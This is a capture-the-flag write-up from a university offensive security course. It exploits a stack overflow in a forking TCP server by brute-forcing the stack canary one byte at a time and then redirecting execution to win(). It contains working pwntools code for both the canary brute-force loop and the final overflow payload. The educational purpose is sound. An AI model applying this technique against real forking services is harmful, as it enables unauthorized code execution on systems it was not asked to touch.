# Weather Station

**Category:** pwn / remote canary brute force (forking server) · **Course:** Offensive Security (PoliTo)

## Challenge

Another forking TCP server, structurally identical in spirit to Fortune Cookie: a location prompt first, then a vulnerable "forecast query" read of 256 bytes into a 48-byte stack buffer.

## Vulnerability

Same root cause as Fortune Cookie — `fork()` without re-exec means every connection's child process shares the exact same stack canary, making a byte-at-a-time blind brute force viable. Here the oracle is the `Forecast sent!\n` message: receiving it means the guessed byte matched the canary; a silent disconnect (crash) means it didn't.

## Exploitation

1. Brute-force all 8 canary bytes using the forked server's shared-canary behaviour. The first byte is fixed at `\x00`, so only 7 are unknown. For each guess, open a fresh connection, answer the location prompt with a dummy `A`, then send `b"A" * 56 + guess` as the forecast query; if the reply contains `Forecast sent!\n`, the byte is correct.
2. Send the real overflow: **56 bytes** of padding to the canary, the recovered canary, 8 bytes of saved-RBP filler (saved RIP is at offset 72), then the address of `win()` straight onto the return address — no alignment gadget is needed here.

The byte-at-a-time oracle (as in `solve.py`):

```python
known = b"\x00"                                  # canary's first byte is always NUL
for i in range(7):
    for bval in range(256):
        guess   = known + bytes([bval])
        payload = b"A" * canary_offset + guess   # canary_offset = 56
        io = remote(host, port, level='error')
        io.recvuntil(b"Enter your location: ")
        io.sendline(b"A")                        # dummy location
        io.recvuntil(b"Submit your forecast query: ")
        io.send(payload)
        data = io.recv(timeout=0.2)
        io.close()
        if b"Forecast sent!\n" in data:          # byte confirmed correct
            known = guess
            break
canary = u64(known)
```

Final exploit with the recovered canary:

```python
payload = flat(
    b"A" * canary_offset,                        # 56
    p64(canary),
    b"B" * (rip_offset - canary_offset - 8),     # 8 bytes saved-RBP filler
    p64(elf.sym.win),                            # straight to win(), no ret gadget
)
io.send(payload)
io.sendline("cat home/user/flag")
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fstack-protector-all -no-pie`: canary enabled, fixed load address)
- `weather_station` — compiled challenge binary
- `solve.py` — working exploit (pwntools); the brute-force loop recovers the canary over ~256 × 7 connections

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
